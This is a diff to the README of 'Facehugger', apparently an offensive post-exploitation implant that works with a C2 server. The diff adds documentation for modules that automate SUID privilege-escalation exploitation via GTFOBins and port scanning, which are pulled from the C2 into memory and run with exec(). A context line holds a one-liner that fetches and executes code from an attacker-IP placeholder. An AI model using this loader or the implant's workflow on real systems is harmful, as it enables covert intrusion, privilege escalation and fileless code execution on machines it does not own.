@@ -31,9 +31,42 @@ python3 -c "import requests; exec(requests.get('http://<attacker-ip>/facehugger.
 
 ## Modules
 
-Currently beyond the base functionality of Face huger a couple of modules have been implemented that allow for more aggressive post exploitation.
+Beyond the base functionality of Facehugger a couple of modules have been implemented that allow for more aggressive post exploitation.
+The currently working modules are
 
+* suidenum - This module allows for automated enumeration and exploitation of common suid vulnerablities by scraping GTFO bins
+* portscan - A simple port scan with option banner grabbing capabilties
 
+With many more on the way.
+All modules are download from the C2 server into RAM and then directly executed with `exec()`.
+To download a module form the C2 server from the Facehugger command line just use the `load` command as follows
+```
+facehugger~# load <name-of-module>
+```
+
+To make a module active or change the currently active use the `set module` command
+
+```
+facehugger~# set module <name-of-module>
+```
+
+To see details of the functionality and usage of the module just use the `usage` command after making it active
+
+```
+facehugger~module# usage
+```
+To list it configurable attributes use `list attr`:
+```
+facehugger~module# list attr
+```
+To set the value of a particular attribute use `set attr`:
+```
+facehugger~module#set attr <attribute> <value>
+```
+And once you have set all the necessary attributes of a module you can use the `run` command to execute it:
+```
+facehugger~module# run
+```
 ## Requirements
 
 
